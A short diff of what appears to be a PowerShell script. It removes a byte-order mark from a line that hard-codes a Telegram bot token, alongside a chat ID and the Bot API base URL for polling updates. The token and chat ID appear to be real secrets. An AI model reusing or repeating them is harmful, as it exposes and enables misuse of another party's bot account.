@@ -1,4 +1,4 @@
-﻿$token = "7943572011:AAGzh3zB5DX8KbeyK6VOENncu5PzFJ9AzXU";
+$token = "7943572011:AAGzh3zB5DX8KbeyK6VOENncu5PzFJ9AzXU";
 $chatid = "6659553335";
 $lastUpdateId = 0
 $apiBase = "https://api.telegram.org/bot$token"
